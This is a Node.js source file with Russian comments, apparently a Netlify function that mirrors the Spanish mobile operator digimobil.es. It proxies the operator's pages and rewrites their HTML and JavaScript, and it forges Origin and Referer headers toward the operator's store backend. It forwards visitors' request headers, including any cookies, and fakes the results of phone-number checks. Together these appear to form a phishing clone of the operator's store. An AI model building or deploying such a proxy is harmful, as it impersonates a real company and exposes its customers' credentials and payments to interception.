const fetch = require('node-fetch');
const utils = require('./utils');
const { Headers } = fetch;

// Проверка является ли запрос API запросом
function isApiRequest(url) {
  return url.pathname.startsWith('/api/');
}

// Обработка запроса проверки номера
async function handleCheckNumberRequest(request, url) {
  try {
    let phoneNumber = '';
    const clientIP = request.headers['client-ip'] || request.headers['x-forwarded-for'] || 'unknown-client';

    // Попытка получить номер телефона из запроса
    if (request.headers['content-type'] && request.headers['content-type'].includes('application/json')) {
      const jsonData = JSON.parse(request.body);
      phoneNumber = jsonData.phone?.first || '';
    } else if (request.headers['content-type'] && request.headers['content-type'].includes('application/x-www-form-urlencoded')) {
      // Парсинг формы. В Netlify это нужно делать вручную
      const params = new URLSearchParams(request.body);
      phoneNumber = params.get('check_number[phone][first]') || '';
    } else {
      // Попытка найти номер телефона в теле запроса
      try {
        const phoneMatch = request.body.match(/phone[^0-9]*([0-9]{9})/i);
        if (phoneMatch && phoneMatch[1]) {
          phoneNumber = phoneMatch[1];
        }
      } catch (e) {}
    }

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*'
      },
      body: JSON.stringify(utils.simulatePhoneCheckResponse(phoneNumber))
    };
  } catch (error) {
    console.error('Error in handleCheckNumberRequest:', error);
    
    // Если возникла ошибка, перенаправляем запрос на оригинальный сайт
    const modifiedRequest = utils.modifyApiRequest(request, url);
    const response = await fetch(`https://${utils.SOURCE_DOMAIN}${url.pathname}${url.search}`, modifiedRequest);
    
    const responseBody = await response.text();
    
    return {
      statusCode: response.status,
      headers: {
        'Content-Type': response.headers.get('Content-Type') || 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*'
      },
      body: responseBody
    };
  }
}

// Обработка запросов к store-backend
async function handleStoreBackend(request, url) {
  const newPath = url.pathname.replace(/^\/store-backend/, '');
  const backendUrl = `https://store-backend.digimobil.es${newPath}${url.search}`;
  
  const headers = {};
  for (const [key, value] of Object.entries(request.headers)) {
    if (!['host', 'origin', 'referer', 'x-forwarded-host', 'x-forwarded-proto'].includes(key.toLowerCase())) {
      headers[key] = value;
    }
  }
  
  headers['Origin'] = 'https://store-backend.digimobil.es';
  headers['Referer'] = 'https://store-backend.digimobil.es/';

  try {
    const backendResponse = await fetch(backendUrl, {
      method: request.method,
      headers: headers,
      body: request.body
    });

    const responseBody = await backendResponse.text();
    const responseHeaders = {};
    
    backendResponse.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });
    
    responseHeaders['Access-Control-Allow-Origin'] = '*';
    responseHeaders['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS';
    responseHeaders['Access-Control-Allow-Headers'] = '*';

    return {
      statusCode: backendResponse.status,
      headers: responseHeaders,
      body: responseBody
    };
  } catch (error) {
    console.error('Error handling store-backend request:', error);
    
    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Error processing store-backend request' })
    };
  }
}

// Перенаправление на оригинальный сайт с модификацией ответа
async function proxyRequest(request, url) {
  try {
    const headers = {};
    for (const [key, value] of Object.entries(request.headers)) {
      if (!['host', 'origin', 'referer'].includes(key.toLowerCase())) {
        headers[key] = value;
      }
    }

    const proxyResponse = await fetch(`https://${utils.SOURCE_DOMAIN}${url.pathname}${url.search}`, {
      method: request.method,
      headers: headers,
      body: request.body
    });

    const contentType = proxyResponse.headers.get('Content-Type') || '';
    
    // Модифицируем HTML или JavaScript
    if (contentType.includes('text/html')) {
      const modifiedResponse = await utils.modifyHTML(proxyResponse);
      return {
        statusCode: proxyResponse.status,
        headers: modifiedResponse.headers,
        body: modifiedResponse.body
      };
    } else if (contentType.includes('javascript')) {
      const modifiedResponse = await utils.modifyJavaScript(proxyResponse);
      return {
        statusCode: proxyResponse.status,
        headers: modifiedResponse.headers,
        body: modifiedResponse.body
      };
    } else {
      // Для остальных типов контента просто передаем ответ
      const responseBody = await proxyResponse.text();
      const responseHeaders = {};
      
      proxyResponse.headers.forEach((value, key) => {
        responseHeaders[key] = value;
      });
      
      responseHeaders['Access-Control-Allow-Origin'] = '*';
      responseHeaders['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS';
      responseHeaders['Access-Control-Allow-Headers'] = '*';

      return {
        statusCode: proxyResponse.status,
        headers: responseHeaders,
        body: responseBody
      };
    }
  } catch (error) {
    console.error('Error in proxyRequest:', error);
    
    return {
      statusCode: 500,
      headers: { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' },
      body: `Error: ${error.message}`
    };
  }
}

module.exports = {
  isApiRequest,
  handleCheckNumberRequest,
  handleStoreBackend,
  proxyRequest
};